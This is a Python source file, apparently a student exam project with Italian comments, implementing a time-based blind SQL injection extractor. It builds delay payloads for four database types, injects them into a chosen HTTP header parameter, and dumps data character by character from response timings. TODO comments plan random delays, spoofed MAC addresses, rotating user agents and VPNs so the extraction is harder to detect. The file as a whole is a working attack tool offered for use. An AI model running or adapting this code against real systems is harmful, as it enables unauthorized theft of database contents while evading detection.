from pathlib import Path
import requests
import sys
import time
from typing import Any
from data_classes import Settings, ExtractedData, optimizer, sql_types
PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))
from utility.persistence import PersistenceUtility


# TODO: implementare multi-threading per estrazione dei dati in parallelo (ad esempio mentre conta la lunghezza del nome altri thread cercano di estrarre i primi 3 caratteri e poi i restanti in parallelo) - lasciare sempre un thread libero
# TODO: implementare delay/sleep con valori casuali per rendere l'estrazione meno rilevabile
# TODO: implementare multi connessioni: ovvero + interfacce virtuali con MAC diversi (random) e user-agent diversi (random) sarebbe interessante anche che fossero collegate a VPN diverse


class BlindSQLIExtractorBase:
    settings: Settings
    extracted_data: ExtractedData
    data_file_name: str
    persistence: PersistenceUtility


    def __init__(self):
        self.settings = Settings()
        self.extracted_data = ExtractedData()
        self.persistence = PersistenceUtility(self)
        self.data_file_name = self.persistence.file_name

    def set_setting(self, key: str, value: Any) -> bool:
        if key not in Settings.__dataclass_fields__:
            print(f"Setting '{key}' non valido.")
            return False

        if key == "sql_type":
            value = str(value).lower().strip()
            if value not in sql_types:
                print(f"SQL_TYPE non valido. Valori accettati: {', '.join(sql_types)}")
                return False
        elif key == "optimizer":
            value = str(value).lower().strip()
            if value not in optimizer:
                print(f"Optimizer non valido. Valori accettati: {', '.join(optimizer)}")
                return False
        elif key == "url":
            value = str(value).strip()
            if value and not value.startswith(("http://", "https://")):
                value = f"http://{value}"
        elif key in {"delay", "request_timeout", "max_retries"}:
            try:
                value = int(value)
            except (TypeError, ValueError):
                print(f"{key} non valido. Deve essere un intero.")
                return False

            if key in {"request_timeout", "max_retries"} and value <= 0:
                print(f"{key} non valido. Deve essere > 0")
                return False
        elif key == "retry_delay":
            try:
                value = float(value)
            except (TypeError, ValueError):
                print("retry_delay non valido. Deve essere un numero.")
                return False

            if value < 0:
                print("retry_delay non valido. Deve essere >= 0")
                return False
        elif key in {"verbose", "hurry_up"} and isinstance(value, str):
            value = value.strip().lower() in {"1", "true", "yes", "y", "on"}

        setattr(self.settings, key, value)
        self.save_data()
        return True
    def get_setting(self, key: str, default: Any = None) -> Any:
        if key not in Settings.__dataclass_fields__:
            return default
        return getattr(self.settings, key, default)
    def __getattr__(self, name: str):
        if name.startswith("set_"):
            k = name[4:]
            if k in Settings.__dataclass_fields__:
                return lambda v: self.set_setting(k, v)
        if name.startswith("get_"):
            k = name[4:]
            if k in Settings.__dataclass_fields__:
                return lambda default=None: self.get_setting(k, default)
        raise AttributeError(name)
    
    def set_header_parameters(self, header: object):
        parameters = header.strip().split(":", 1)
        if len(parameters) != 2:
            print("Errore: il formato dell'header non è valido. Il formato corretto è 'Header-Name: Header-Value'.")
            return
        
        self.settings.header_parameters[parameters[0]] = parameters[1].strip()
        self.save_data()
    def set_parameter_target(self, parameter: str):
        if not self.settings.header_parameters:
            print(
                "Errore: è necessario impostare prima un header target (funzione set_header_parameters() o add_header_parameters())"
            )
            return

        parameter = parameter.strip()
        if not parameter:
            print("Errore: il nome del parametro target non può essere vuoto.")
            return

        parameter_found = False
        for value in self.settings.header_parameters.values():
            if isinstance(value, str) and parameter in value:
                parameter_found = True
                break

        if not parameter_found:
            print(
                f"Errore: il parametro '{parameter}' non è presente nei valori dell'header target. Header fornito: {self.settings.header_parameters}"
            )
            return

        self.settings.parameter_target = parameter
        self.save_data()

    def add_header_parameters(self, header: object):
        if not self.settings.header_parameters:
            self.settings.header_parameters = header
        else:
            self.settings.header_parameters = {**self.settings.header_parameters, **header}

    def is_really_time_based_injection(self):
        return self.oracle("1=1")

    def internal_check_target(self):
        if not self.settings.post_parameters and not self.settings.get_parameters and not self.settings.header_parameters:
            print(
                "Errore: è necessario impostare almeno un target (funzione set_post_parameters(), set_get_parameters() o set_header_parameters()) per definire automaticamente il tipo di SQL Injection"
            )
            return False
        return True

    def encode_query(self, q):
        encoded_query = requests.utils.quote(q, safe="")
        if self.settings.verbose:
            print(f"\r\nEncoded query: {encoded_query}\r\n")
        return encoded_query

    def get_delayed_query(self, q):
        if "mssql" == self.settings.sql_type:
            query = f"';IF({q}) WAITFOR DELAY '0:0:{self.settings.delay}'--"
        elif "mysql" == self.settings.sql_type:
            query = f"';IF({q}) THEN SLEEP({self.settings.delay})--"
        elif "postgresql" == self.settings.sql_type:
            query = f"';IF({q}) THEN PG_SLEEP({self.settings.delay})--"
        elif "oracle" == self.settings.sql_type:
            query = f"';IF({q}) THEN DBMS_LOCK.SLEEP({self.settings.delay})--"
        else:
            query = ""

        return query
    # Not developed because out of exam scope
    def get_encoded_post_query(self, q):
        print("WARNING - Injection with POST parameter not developed because out of exam scope")
        return
    # Not developed because out of exam scope
    def get_encoded_get_query(self, q):
        print("WARNING - Injection with GET parameter not developed because out of exam scope")
        return
    def get_encoded_header_query(self, q):
        if not self.settings.parameter_target:
            print(
                "Errore: è necessario impostare prima un header parameter target (funzione set_parameter_target())"
            )
            return None

        injected = False
        delayed_query = self.get_delayed_query(q)
        if self.settings.verbose:
            print(f"\r\nDelayed query: {delayed_query}")
        injected_header = dict(self.settings.header_parameters)

        for header, value in self.settings.header_parameters.items():
            if not isinstance(value, str):
                continue

            parameters = value.split(self.settings.delimiter)
            for i, param in enumerate(parameters):
                param_name = param.strip().split("=", 1)[0].strip()
                if param_name != self.settings.parameter_target:
                    continue

                parameters[i] = param + self.encode_query(delayed_query)
                injected_header[header] = self.settings.delimiter.join(parameters)
                injected = True
                break

            if injected:
                break

        if not injected:
            print(
                f"Errore: non è stato possibile iniettare la query nell'header. Verificare che il parametro '{self.settings.parameter_target}' sia presente in uno dei valori dell'header target e che il delimitatore '{self.settings.delimiter}' sia corretto."
            )
            return None

        if self.settings.verbose:
            print(f"Injected headers: {injected_header}")

        return injected_header

    def oracle(self, q):
        if not self.internal_check_target():
            return
        if not self.settings.sql_type:
            self.define_sql_type()

        print('.', end="", flush=True)
        sys.stdout.flush()

        timeout = max(self.settings.request_timeout, self.settings.delay + 5)
        max_attempts = self.settings.max_retries
        last_exception = None

        for attempt in range(1, max_attempts + 1):
            try:
                start = time.monotonic()
                if self.settings.post_parameters:
                    data = self.get_encoded_post_query(q)
                    if not data:
                        return None

                    r = requests.post(
                        self.settings.url,
                        data=data,
                        headers=self.settings.header_parameters,
                        timeout=timeout,
                        stream=True,
                    )
                else:
                    if self.settings.get_parameters:
                        url = self.get_encoded_get_query(q)
                        if not url:
                            return None

                        r = requests.get(
                            url,
                            headers=self.settings.header_parameters,
                            timeout=timeout,
                            stream=True,
                        )
                    else:
                        injected_and_encoded_headers = self.get_encoded_header_query(q)
                        if not injected_and_encoded_headers:
                            return None

                        r = requests.get(
                            self.settings.url,
                            headers=injected_and_encoded_headers,
                            timeout=timeout,
                            stream=True,
                        )

                elapsed = time.monotonic() - start
                r.close()

                if self.settings.verbose:
                    print(f"{r} ({elapsed:.2f}s) [tentativo {attempt}/{max_attempts}]", end="\r\n", flush=True)
                    sys.stdout.flush()

                return elapsed >= self.settings.delay

            except requests.exceptions.RequestException as exc:
                last_exception = exc
                if self.settings.verbose:
                    print(
                        f"\r\nErrore request (tentativo {attempt}/{max_attempts}): {exc}",
                        end="\r\n",
                        flush=True,
                    )

                if attempt < max_attempts and self.settings.retry_delay > 0:
                    time.sleep(self.settings.retry_delay)

            finally:
                time.sleep(0.5)

        print(f"\r\nErrore: richiesta fallita dopo {max_attempts} tentativi. Ultimo errore: {last_exception}")
        return None

    def dump_length(self, q):
        length = 0
        for p in range(7):
            bit_is_true = self.oracle(f"({q})&{2**p}>0")
            if bit_is_true is None:
                return None

            if bit_is_true:
                length |= 2**p

        return length
    def dump_string_anding(self, q, length):
        val = ""
        for i in range(1, length + 1):
            c = 0
            for p in range(7):
                bit_is_true = self.oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0")
                if bit_is_true is None:
                    return None

                if bit_is_true:
                    c |= 2**p

            print(chr(c), end="", flush=True)
            sys.stdout.flush()
            val += chr(c)

        print("\r\n")
        return val
    def dump_string_bisection(self, q, length):
        val = ""
        for i in range(1, length + 1):
            low = 0
            high = 127
            while low <= high:
                mid = (low + high) // 2
                is_in_range = self.oracle(f"ASCII(SUBSTRING(({q}),{i},1)) BETWEEN {low} AND {mid}")
                if is_in_range is None:
                    return None

                if is_in_range:
                    high = mid - 1
                else:
                    low = mid + 1
            print(chr(low), end="", flush=True)
            sys.stdout.flush()
            val += chr(low)
        print("\r\n")
        return val

    

    def use_saved_settings(self):
        try:
            merged_settings = self.persistence.merge_with_defaults(
                defaults=Settings(),
                payload=self.persistence.saved_data.get("settings"),
                strict_keys=True,
            )
            if not isinstance(merged_settings.get("header_parameters"), dict):
                merged_settings["header_parameters"] = {}

            self.settings = Settings(**merged_settings)

            return self.settings
        
        except Exception as e:
            print(f"Errore durante il ripristino delle impostazioni: {e}")
            return None
        
    def use_extracted_data(self):
        try:
            extracted_payload = self.persistence.saved_data.get("extracted_data")
            if not isinstance(extracted_payload, dict):
                print("Errore durante il ripristino dei dati: payload non valido.")
                return None

            self.extracted_data = ExtractedData(**extracted_payload)
            return self.extracted_data
        except Exception as e:
            print(f"Errore durante il ripristino dei dati: {e}")
            return None

    def save_data(self):
        data_to_save = {
            "settings": self.persistence.to_serializable(self.settings),
            "extracted_data": self.persistence.to_serializable(self.extracted_data),
        }
        return self.persistence.save_data(
            data_to_save,
            indent=4,
        )
